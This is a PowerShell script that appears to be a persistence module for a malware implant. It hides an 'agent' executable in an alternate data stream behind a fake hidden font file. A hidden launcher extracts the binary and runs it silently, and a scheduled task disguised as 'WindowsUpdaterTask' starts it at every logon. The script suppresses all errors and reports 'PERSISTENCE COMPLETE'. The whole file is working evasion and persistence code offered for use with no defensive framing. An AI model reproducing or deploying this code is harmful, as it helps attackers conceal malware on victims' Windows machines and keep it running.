$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# --- 1. Create fake font file in Fonts folder ---
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
    Write-Output "[+] Created hidden fonts folder"
}

$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    $fakeFontContent = "TTF fake font file - do not delete"
    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
    attrib +h $fontFile
    Write-Output "[+] Created fake font file: $fontFile"
} else {
    Write-Output "[+] Using existing font file: $fontFile"
}

# --- 2. Hide agent in ADS ---
$streamName = "Zone.Identifier"
Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$fontFile`:$streamName"

# --- 3. Create launcher script (run.ps1) with cleanup ---
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"

# Delete old temp file if it exists
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }

# Extract agent from ADS
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath
Write-Output "[+] Created launcher with cleanup: $launcherPath"

# --- 4. Create scheduled task (try COM, fallback to schtasks) ---
$taskName = "WindowsUpdaterTask"
$taskCommand = "powershell.exe -WindowStyle Hidden -File `"$launcherPath`""
$taskCreated = $false

# First try COM
try {
    Write-Output "[*] Attempting to create task via COM..."
    $taskService = New-Object -ComObject Schedule.Service
    if (-not $taskService) { throw "Failed to create Schedule.Service object" }
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")
    if (-not $rootFolder) { throw "Failed to get root folder" }

    # Delete existing task if any
    try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }

    $taskDefinition = $taskService.NewTask(0)
    if (-not $taskDefinition) { throw "Failed to create task definition" }

    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3  # TASK_LOGON_INTERACTIVE_TOKEN

    $trigger = $taskDefinition.Triggers.Create(9)  # TASK_TRIGGER_LOGON
    $trigger.UserId = $env:USERNAME

    $action = $taskDefinition.Actions.Create(0)  # TASK_ACTION_EXEC
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""

    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created/updated via COM."
    $taskCreated = $true
} catch {
    Write-Output "[-] COM task creation failed: $_"
}

# Fallback to schtasks if COM failed
if (-not $taskCreated) {
    Write-Output "[*] Falling back to schtasks..."
    try {
        # Delete existing task if any
        schtasks /delete /tn $taskName /f *>$null
        # Create new task
        schtasks /create /tn $taskName /tr "$taskCommand" /sc onlogon /ru $env:USERNAME /f /it *>$null
        if ($LASTEXITCODE -eq 0) {
            Write-Output "[+] Scheduled task '$taskName' created/updated via schtasks."
            $taskCreated = $true
        } else {
            Write-Output "[-] schtasks failed with exit code $LASTEXITCODE"
        }
    } catch {
        Write-Output "[-] schtasks exception: $_"
    }
}

if (-not $taskCreated) {
    Write-Output "❌ Failed to create scheduled task using any method. Persistence will not survive reboot."
} else {
    Write-Output ""
    Write-Output "✅ PERSISTENCE COMPLETE"
    Write-Output "Script location: $launcherPath"
    Write-Output "Agent hidden in: $hiddenPath"
    Write-Output "The scheduled task will run the script from the permanent folder on next logon."
}